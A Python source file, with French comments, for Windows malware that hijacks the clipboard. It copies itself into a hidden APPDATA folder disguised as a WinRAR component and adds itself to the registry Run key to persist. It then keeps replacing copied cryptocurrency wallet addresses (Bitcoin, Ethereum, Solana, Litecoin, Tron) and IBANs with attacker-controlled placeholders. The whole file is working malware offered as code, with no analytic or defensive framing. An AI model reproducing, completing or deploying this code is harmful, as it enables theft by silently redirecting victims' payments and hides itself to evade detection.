import os
import sys
import shutil
import winreg as reg
import re
import time
import hashlib
import random
import win32clipboard

import requests
from requests.exceptions import RequestException
import subprocess
import sys
from colorama import init, Fore, Style
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread, Lock
from tqdm import tqdm
from bs4 import BeautifulSoup
import cloudscraper
import logging


# Définition des expressions régulières et des adresses de remplacement pour différentes crypto-monnaies
identifiers = {
    'ethereum': {'regex': r'\b0x[a-fA-F0-9]{40}\b', 'replacement': '0xNEW_ETHEREUM_ADDRESS'},
    'solana': {'regex': r'\b[A-Za-z0-9]{44}\b', 'replacement': 'NEW_SOLANA_ADDRESS'},
    'litecoin': {'regex': r'\b([LM3][a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1[a-z0-9]{39})\b', 'replacement': 'NEW_LITECOIN_ADDRESS'},
    'bitcoin': {'regex': r'\b[13][a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[q0-9]{39,59}\b', 'replacement': 'NEW_BITCOIN_ADDRESS'},
    'tron': {'regex': r'\bT[1-9A-HJ-NP-Za-km-z]{33}\b', 'replacement': 'NEW_TRON_ADDRESS'},
    'iban': {'regex': r'\b[A-Z]{2}[0-9]{2}\s?([0-9A-Z]{4}\s?){4,7}[0-9A-Z]{1,3}\b', 'replacement': 'REPLACEMENT_IBAN'},
}

def get_clipboard_text():
    win32clipboard.OpenClipboard()
    data = ""
    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
        data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return data

def set_clipboard_text(text):
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardData(win32clipboard.CF_UNICODETEXT, text)
    win32clipboard.CloseClipboard()

def replace_identifier(clipboard_content):
    for identifier_type, info in identifiers.items():
        pattern = info['regex']
        replacement = info['replacement']
        if re.search(pattern, clipboard_content) and replacement is not None:
            replaced_content = re.sub(pattern, replacement, clipboard_content)
            return replaced_content
    return clipboard_content

def move_to_target_directory(target_directory):
    current_file = sys.executable
    file_name = os.path.basename(current_file)
    destination = os.path.join(target_directory, file_name)
    
    if current_file == destination:
        return True
    
    if not os.path.exists(target_directory):
        os.makedirs(target_directory)
        os.system(f'attrib +h "{target_directory}"')
    
    try:
        shutil.copy(current_file, destination)
        os.startfile(destination)
        sys.exit()
    except Exception as e:
        print(f"Erreur lors du déplacement du fichier : {e}")
        return False

def add_to_startup(file_path):
    exe_name = os.path.basename(sys.executable)
    path = os.path.join(file_path, exe_name)
    key = reg.HKEY_CURRENT_USER
    key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    hasher = hashlib.md5()
    hasher.update(path.encode('utf-8'))
    value_name = hasher.hexdigest()

    try:
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, path)
        reg.CloseKey(reg_key)
    except WindowsError as e:
        print(f"Erreur lors de l'ajout au démarrage : {e}")

target_directory = os.path.join(os.getenv('APPDATA'), 'WinRarComponments')

if __name__ == "__main__":
    moved = move_to_target_directory(target_directory)
    if moved:
        add_to_startup(target_directory)
    
    last_processed_content = None
    while True:
        current_clipboard_content = get_clipboard_text()
        if current_clipboard_content != last_processed_content:
            new_clipboard_content = replace_identifier(current_clipboard_content)
            if new_clipboard_content != current_clipboard_content:
                set_clipboard_text(new_clipboard_content)
                print("Le contenu du presse-papiers a été mis à jour.")
            last_processed_content = new_clipboard_content
        time.sleep(random.randint(1, 2))
